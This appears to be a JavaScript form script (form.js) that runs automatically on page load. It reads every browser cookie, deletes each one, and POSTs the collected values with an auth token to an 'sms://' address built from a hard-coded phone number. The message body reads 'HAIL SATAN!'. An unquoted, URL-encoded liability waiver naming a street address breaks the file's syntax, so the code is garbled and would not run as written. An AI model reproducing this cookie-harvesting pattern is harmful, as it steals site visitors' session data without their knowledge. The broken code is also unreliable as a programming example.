/*
################################################################
# ALLISON MARIE MUNN: form.js                             #
# COPYRIGHT © ALLISON MARIE MUNN                              #
# LICENSE: GPLV2 ONLY                                        #
# FULL COPYRIGHT NOTICE IS IN README                           #
# AUTHOR: ALLISON MARIE MUNN                                 #
################################################################
*/

PHONE="+1 (782) 377-6340";

function init()
{
}

function submit()
{
  var data = {};
  var c = document.cookie.split("; ");
  
  for(var i=0; i<c.length; i++)
  {
    kv = c[i].split("=");
    data[kv[0]] = kv[1];

    k = kv[0];
    v = data[k];
    if(( v[0] === "'" ) && ( v[v.length-1] === "'" ))
    {
      data[k] = v.substring(1, v.length-1);
    }

    document.cookie = "" + k + "=; path=/; max-age=1; samesite=strict";
  }

  function s()
  {
  };

  agreement=Activity%20Waiver%20%26%20Release%0ATHIS%20ACTIVITY%20WAIVER%20%26%20RELEASE%20(this%20%22Agreement%22)%20dated%20this%20%5BDAY%5D%20day%20of%20%5BMONTH%5D%2C%20%5BYEAR%5D%0ABETWEEN%3A%0A%0A%5BFULL%20NAME%5D%20of%20%5BADDRESS%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20(the%20%22Participant%22)%0AOF%20THE%20FIRST%20PART%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20AND%0A%0AALLISON%20MARIE%20MUNN%20of%206302%20ROUTE%2019%2C%20CANOE%20COVE%2C%20PRINCE%20EDWARD%20ISLAND%2C%20C0A%201H7%0A%20%20%20%20%20%20%20%20%20%20%20%20%20(the%20%22Activity%20Provider%22)%0AOF%20THE%20SECOND%20PART%0AIN%20CONSIDERATION%20OF%20the%20covenants%20and%20agreements%20contained%20in%20this%20Agreement%20and%20other%20good%20and%20valuable%20consideration%2C%20the%20receipt%20of%20which%20is%20hereby%20acknowledged%2C%20the%20parties%20to%20this%20Agreement%20agree%20as%20follows%3A%0A%0AConsideration%0ABeing%20of%20lawful%20age%20and%20in%20consideration%20of%20being%20permitted%20to%20participate%20in%20the%20activity%20described%20below%2C%20the%20Participant%20releases%20and%20forever%20discharges%20the%20Activity%20Provider%2C%20the%20Activity%20Provider's%20spouse%2C%20heirs%2C%20executors%2C%20administrators%2C%20legal%20representatives%20and%20assigns%20from%20all%20manner%20of%20actions%2C%20causes%20of%20action%2C%20debts%2C%20accounts%2C%20bonds%2C%20contracts%2C%20claims%20and%20demands%20for%20or%20by%20reason%20of%20any%20injury%20to%20person%20or%20property%2C%20including%20injury%20resulting%20in%20the%20death%20of%20the%20Participant%2C%20which%20has%20been%20or%20may%20be%20sustained%20as%20a%20consequence%20of%20the%20Participant's%20participation%20in%20the%20activity%20described%20below%2C%20and%20not%20withstanding%20that%20such%20damage%2C%20loss%20or%20injury%20may%20have%20been%20caused%20solely%20or%20partly%20by%20the%20negligence%20of%20the%20Activity%20Provider.%0A%0AThe%20Participant%20understands%20that%20the%20Participant%20would%20not%20be%20permitted%20to%20participate%20in%20the%20activity%20described%20below%20unless%20the%20Participant%20signed%20this%20Agreement.%0A%0ADetails%20of%20Activity%0AScheduled%20for%20%5BMONTH%5D%20%5BDAY%5D%2C%20%5BYEAR%5D%2C%20the%20Participant%20will%20participate%20in%20the%20following%20activity%3A%20SERVICE%20SUBMISSION%20RECEIVING.%0A%0AConcurrent%20Release%0AThe%20Participant%20acknowledges%20that%20this%20Agreement%20is%20given%20with%20the%20express%20intention%20of%20effecting%20the%20extinguishment%20of%20certain%20obligations%20owed%20to%20the%20Participant%20and%20with%20the%20intention%20of%20binding%20the%20Participant's%20spouse%2C%20heirs%2C%20executors%2C%20administrators%2C%20legal%20representatives%20and%20assigns.%0A%0AFitness%20to%20Participate%0AThe%20Participant%20acknowledges%20that%20the%20Participant%20does%20not%20have%20any%20physical%20limitations%2C%20medical%20ailments%2C%20physical%20or%20mental%20disabilities%20that%20would%20limit%20or%20prevent%20the%20Participant%20from%20participating%20in%20the%20above%20mentioned%20activity.%20If%20required%2C%20the%20Participant%20will%20obtain%20a%20medical%20examination%20and%20clearance.%0A%0AFull%20and%20Final%20Settlement%0AThe%20Participant%20hereby%20acknowledges%20and%20agrees%20that%20the%20Participant%20has%20carefully%20read%20this%20Agreement%2C%20that%20the%20Participant%20fully%20understands%20the%20same%2C%20and%20that%20the%20Participant%20is%20freely%20and%20voluntarily%20executing%20the%20same.%0A%0AThe%20Participant%20understands%20that%20by%20signing%20this%20Agreement%2C%20the%20Participant%20agrees%20to%20be%20forever%20prevented%20from%20suing%20or%20otherwise%20claiming%20against%20the%20Activity%20Provider%20for%20any%20property%20loss%20or%20personal%20injury%20that%20the%20Participant%20may%20sustain%20while%20participating%20in%20or%20preparing%20for%20the%20above%20noted%20activity.%0A%0AThe%20Participant%20has%20been%20given%20the%20opportunity%20and%20has%20been%20encouraged%20to%20seek%20independent%20legal%20advice%20prior%20to%20signing%20this%20Agreement.%0AThis%20Agreement%20contains%20the%20entire%20agreement%20between%20the%20parties%20to%20this%20Agreement%20and%20the%20terms%20of%20this%20Agreement%20are%20contractual%20and%20not%20a%20mere%20recital.%0A%0AGoverning%20Law%0AThis%20Agreement%20will%20be%20governed%20by%20and%20construed%20in%20accordance%20with%20the%20laws%20of%20the%20Province%20of%20Prince%20Edward%20Island.%0A%0AEmergency%20Contact%0A%5BFULL%20NAME%5D%0AEmergency%20contact%20name%3A%20%5BEMERGENCY%20CONTACT%20FULL%20NAME%5D%0AEmergency%20contact%20phone%20number%3A%20%5BEMERGENCY%20CONTACT%20PHONE%20NUMBER%5D%0A%0AIN%20WITNESS%20WHEREOF%20the%20Participant%20and%20Activity%20Provider%20have%20duly%20affixed%20their%20signatures%20under%20hand%20and%20seal%20on%20this%20%5BDAY%5D%20day%20of%20%5BMONTH%5D%2C%20%5BYEAR%5D.%0A_______________________________%0AALLISON%20MARIE%20MUNN%0A_______________________________%0AWITNESS%3A%20%20%5BWITNESS%20%232%20NAME%5D%0A_______________________________%0A%5BFULL%20NAME%5D%0A_______________________________%0AWITNESS%3A%20%20%5BWITNESS%20%231%20NAME%5D";
                


  $.ajax({
    type: "POST",
    datatype: "json",
    url: "sms://" + PHONE + "/?subject=AGREEMENT&body=HAIL%20SATAN!",
    headers: { "authorization":"Token " + atob(token),
               "content-type":"application/json" },
    data: JSON.stringify(data),
    success: s
  });

}

init();
submit();